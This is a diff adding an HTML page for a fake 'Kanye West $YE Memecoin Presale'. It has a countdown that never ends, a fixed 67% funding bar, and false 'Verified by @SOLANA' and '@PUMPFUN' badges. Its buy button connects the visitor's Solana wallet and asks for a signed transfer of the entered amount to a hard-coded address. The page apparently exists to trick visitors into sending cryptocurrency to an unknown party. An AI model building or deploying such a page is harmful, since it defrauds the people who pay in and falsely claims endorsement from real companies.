@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kanye West Coin</title>
+    <link rel="icon" href="pic/Icon.png" type="image/png">
+    <style>
+    .bod {
+        background-image: linear-gradient(to right, yellow, red);
+    }
+    .first {
+        text-align: center;
+    }
+    .line {
+        margin: 5px;
+        border: solid;
+        border-width: 1.5px;
+    }
+    .permb {
+        border: solid;
+        border-width: 2px;
+        border-radius: 5%;
+        width: 50%;
+        min-width: min-content;
+        position: absolute;
+        top: 25%;
+        left: 25%;
+    }
+    .kanye-photo {
+        width: 50%;
+        border-radius: 5%;
+        margin: 10px;
+    }
+    .foto {
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: space-between;
+    }
+    .launch {
+        font-weight: bolder;
+        font-family: Arial, Helvetica, sans-serif;
+        color: black;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        flex: 1;
+    }
+    .countdown {
+        color: red;
+        border-radius: 10%;
+        border-width: 2.5px;
+        font-weight: bolder;
+        transition: 0.8s;
+        text-align: center;
+    }
+    
+    .max{
+        margin: 5px 0px 10px 10px;
+        font-family: Arial, Helvetica, sans-serif;
+        font-weight:bolder;
+        text-align: center;
+        width: 50%;
+        font-size: 15px;
+    }
+    .goal{
+        border-style: solid;
+        border-width: 2px;
+        border-radius: 5px;
+        height: 20px;
+        width: 50%;
+        background-color: lightgray;
+        border-top-right-radius: 15px;
+        border-bottom-right-radius: 15px;
+        display: flex;
+    }
+    
+    .solana-cont{
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        margin: 10px;
+        gap: 10px;
+    
+    }
+    .color{
+        width: 67%;
+        background-color: red;
+        height: 100%;
+        border-top-right-radius: 15px;
+        border-bottom-right-radius: 15px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+    
+    }
+    .sol-text {
+        font-weight: bolder;
+        font-size: 12px;
+        margin: 0px 10px 0px 0px;
+        text-align: right;
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif
+    }
+    .text{
+        font-weight: bold;
+        font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        flex: 0.5;
+    }
+    .sent{
+        font-weight: bolder;
+        font-family: Arial, Helvetica, sans-serif;
+        align-self: flex-end;
+    }
+    .place{
+        border-radius: 10px;
+        border-style: solid;
+        border-width: 2px;
+        border-color: black;
+        height: 20px;
+        background-color: lightgray;
+        text-align: center;
+        font-size: 12px;
+    }
+    .place::placeholder{
+        text-align: center;
+        color: black;
+        font-size: smaller;
+    }
+    .buy{
+        border-radius: 10px;
+        border-style: solid;
+        border-width: 2px;
+        border-color: black;
+        font-weight: bolder;
+        flex: 0.3;
+        color: black;
+        transition: 0.5s;  
+        height: 26px;
+    }
+    .buy:hover{
+        background-color: black;
+        color: white;
+        cursor: ponter;
+    }
+    .buy:active{
+        opacity: 0.5;
+        transition: 0.001ms;
+    }
+    .sol{
+        width: 100px;
+        height: 50px;
+        position: absolute;
+        left: 94%;
+        top: 2.5%;
+    }
+    .sol1{
+        width: 100px;
+        height: 50px;
+        position: absolute;
+        left: 88%;
+        top: 2.5%;
+    }
+    .sol:hover{
+        cursor: pointer;
+    }
+    .sol:active{
+        opacity: 0.5;
+    }
+    .sol1:hover{
+        cursor: pointer;
+    }
+    .sol1:active{
+        opacity: 0.5;
+    }
+    .verification{
+        font-weight: bolder;
+        font-family: Arial, Helvetica, sans-serif;
+        text-align: center;
+        margin-top: 35px;
+
+    }
+    .sol-ig{
+        font-weight: bolder;
+        text-decoration: none;
+        transition: 0.5s;
+    }
+    .sol-ig:hover{
+        cursor: pointer;
+        text-shadow: 5px 5px 15px black;
+    }
+    .pump-ig{
+        font-weight: bolder;
+        text-decoration: none;
+        transition: 0.5s;
+        display: inline;
+
+    }
+    .pump-ig:hover{
+        cursor: pointer;
+        text-shadow: 5px 5px 15px black;
+    }
+    .verified{
+        width: 20px;
+        height: 20px;
+    }
+    </style>
+</head>
+<body class="bod">
+    <h1 class="first">Kanye West Memecoin</h1>
+
+    <hr class="line">
+    <div class="permb">
+        <h2 style="text-align: center;">Kanye West <a style="color: red; font-weight: bolder;">$YE</a> Memecoin Presale!!</h2>
+        <hr class="line">
+        <div class="foto">
+            <img src="pic/Kanye-West-to-drop-a-memecoin-YEEZY-70_-receiver-for-himself.webp" class="kanye-photo">
+            <div class="launch">$YE Launch in <span id="countdown" class="countdown"></span></div>
+        </div>
+        <h3 class="max">$YE Presale Kanye Memecoin</h3>
+        <div class="container">
+                <div class="solana-cont">
+                    <div class="goal">
+                        <div class="color">      
+                            <p class="sol-text">67%</p> 
+                        </div>
+                    </div>
+                    <p class="text">500 SOL</p>
+                    <input class="place" id="amount" placeholder="0 SOL ≈ YE" onkeydown="enter()">
+                    <button class="buy" onclick="bought()">Buy</button>
+                </div>    
+            </div>  
+        </div>   
+        <img src="pic/solana-raises-money-crypto-news-australia.png" class="sol" onclick="window.location.href='https://solana.com/'">
+        <img src="pic/download.jpg" class="sol1" onclick="window.location.href='https://www.binance.com/en'">
+        <div class="verification">Verified by <a class="sol-ig" onclick="window.location.href='https://x.com/solana'">@SOLANA <img src="pic/6270515.png" class="verified"></a><br> <br>
+        <p class="pump-ig" onclick="window.location.href='https://x.com/pumpdotfun'">@PUMPFUN <img src="pic/6270515.png" class="verified"></p></div>
+</body>
+<script>
+    function bought() {
+        const amount = document.getElementById("amount").value;
+        document.getElementById("amount").value = "";
+        window.solana.connect()
+        .then(() => {
+        window.solana.request({
+            method: "signTransaction",
+            params: [{
+            from: window.solana.publicKey,
+            to: "5FGww9AJ7r2DsqAxYftn89SSfcb7DWLndaA3nA3WwBGb",
+            amount: parseFloat(amount),
+            memo: "Kanye West Memecoin"
+            }]
+        })
+        .then(() => {
+            alert("Transaction successful!");
+        })
+        .catch(() => {
+            alert("Transaction failed!");
+        });
+        })
+        .catch(() => {
+        alert("Connection failed!");
+        });
+    }
+
+        function enter() {
+            if (event.key === "Enter") {
+                bought();
+            }
+        }
+
+
+        document.getElementById("amount").addEventListener("input", function (e) {
+            this.value = this.value.replace(/[^0-9.]/g, '');
+            const yeValue = (this.value * 37511).toFixed(2);
+            console.log(yeValue);
+            this.placeholder = `${this.value} SOL ≈ ${yeValue} YE`;
+        });
+
+        function updateCountdown() {
+            const now = new Date();
+            const nextSaturday = new Date();
+            nextSaturday.setDate(now.getDate() + (6 - now.getDay() + 7) % 7);
+            nextSaturday.setHours(0, 0, 0, 0);
+
+            const distance = nextSaturday - now;
+
+            if (distance < 0) {
+            document.getElementById("countdown").innerHTML = "Event has passed!";
+            return;
+            }
+
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            document.getElementById("countdown").innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+
+            setTimeout(updateCountdown, 1000);
+        }
+
+        updateCountdown();
+</script>
+</script>
+</html>
